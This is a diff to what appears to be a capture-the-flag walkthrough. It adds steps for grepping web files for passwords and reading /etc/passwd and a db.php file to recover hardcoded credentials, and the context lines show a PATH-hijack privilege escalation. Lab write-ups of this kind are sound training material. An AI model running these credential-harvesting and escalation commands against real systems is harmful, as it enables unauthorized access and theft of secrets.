@@ -506,6 +506,150 @@ cat * | grep -i passw*
 # $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
 ```
 
+```bash
+cat * |grep -i passw*
+if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
+<input type="password" name="password" placeholder="Password" />
+```
+
+```bash
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+Each line is an entry from the Linux `/etc/passwd` file, which defines user accounts. The fields are separated by colons (`:`) and have the following format:
+
+`username:password:UID:GID:comment:home_directory:shell`
+
+Here’s a line-by-line explanation:
+
+- **root:x:0:0:root:/root:/bin/bash**  
+  - `root`: Username (superuser)  
+  - `x`: Password placeholder (actual password in `/etc/shadow`)  
+  - `0`: User ID (UID), 0 = root  
+  - `0`: Group ID (GID), 0 = root group  
+  - `root`: Comment/description  
+  - `/root`: Home directory  
+  - `/bin/bash`: Login shell
+
+- **daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin**  
+  - System daemon user, not for login
+
+- **bin:x:2:2:bin:/bin:/usr/sbin/nologin**  
+  - Owns system binaries, not for login
+
+- **sys:x:3:3:sys:/dev:/usr/sbin/nologin**  
+  - System user for system files, not for login
+
+- **sync:x:4:65534:sync:/bin:/bin/sync**  
+  - Used for running `/bin/sync`, rarely used directly
+
+- **games:x:5:60:games:/usr/games:/usr/sbin/nologin**  
+  - For game files, not for login
+
+- **man:x:6:12:man:/var/cache/man:/usr/sbin/nologin**  
+  - For manual pages, not for login
+
+- **lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin**  
+  - Line printer system, not for login
+
+- **mail:x:8:8:mail:/var/mail:/usr/sbin/nologin**  
+  - For mail system, not for login
+
+- **news:x:9:9:news:/var/spool/news:/usr/sbin/nologin**  
+  - For news server, not for login
+
+- **uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin**  
+  - Unix-to-Unix Copy, not for login
+
+- **proxy:x:13:13:proxy:/bin:/usr/sbin/nologin**  
+  - For proxy services, not for login
+
+- **www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin**  
+  - Web server user (e.g., Apache), not for login
+
+- **backup:x:34:34:backup:/var/backups:/usr/sbin/nologin**  
+  - For backup operations, not for login
+
+- **list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin**  
+  - Mailing list manager, not for login
+
+- **irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin**  
+  - IRC server, not for login
+
+- **gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin**  
+  - Bug tracking system, not for login
+
+- **nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin**  
+  - Unprivileged user for running untrusted processes
+
+- **systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin**  
+  - For systemd network management, not for login
+
+- **systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin**  
+  - For systemd DNS resolver, not for login
+
+- **syslog:x:102:106::/home/syslog:/usr/sbin/nologin**  
+  - For system logging, not for login
+
+- **messagebus:x:103:107::/nonexistent:/usr/sbin/nologin**  
+  - For D-Bus message bus, not for login
+
+- **_apt:x:104:65534::/nonexistent:/usr/sbin/nologin**  
+  - For package management (APT), not for login
+
+- **lxd:x:105:65534::/var/lib/lxd/:/bin/false**  
+  - For LXD container management, login disabled
+
+- **uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin**  
+  - For UUID daemon, not for login
+
+- **dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin**  
+  - For DNS/DHCP server, not for login
+
+- **landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin**  
+  - For Landscape system management, not for login
+
+- **pollinate:x:109:1::/var/cache/pollinate:/bin/false**  
+  - For pollinate entropy service, login disabled
+
+- **sshd:x:110:65534::/run/sshd:/usr/sbin/nologin**  
+  - For SSH daemon, not for login
+
+- **robert:x:1000:1000:robert:/home/robert:/bin/bash**  
+  - Regular user account for "robert", can log in
+
+- **mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false**  
+  - For MySQL server, login disabled
 **User Enumeration:**
 ```bash
 # Check available users
@@ -513,6 +657,16 @@ cat /etc/passwd | grep -E "(bash|sh)$"
 
 # Identify target user: robert
 ```
+
+After Identifying the user `robert`, we can check for any credentials or sensitive files associated with this user.
+```bash
+cat db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+```
+
+
 
 ### Escalation Vector Identification
 
@@ -549,7 +703,6 @@ chmod +x cat
 
 # Modify PATH to prioritize /tmp directory
 export PATH=/tmp:$PATH
-
 # Verify PATH modification
 echo $PATH
 # /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
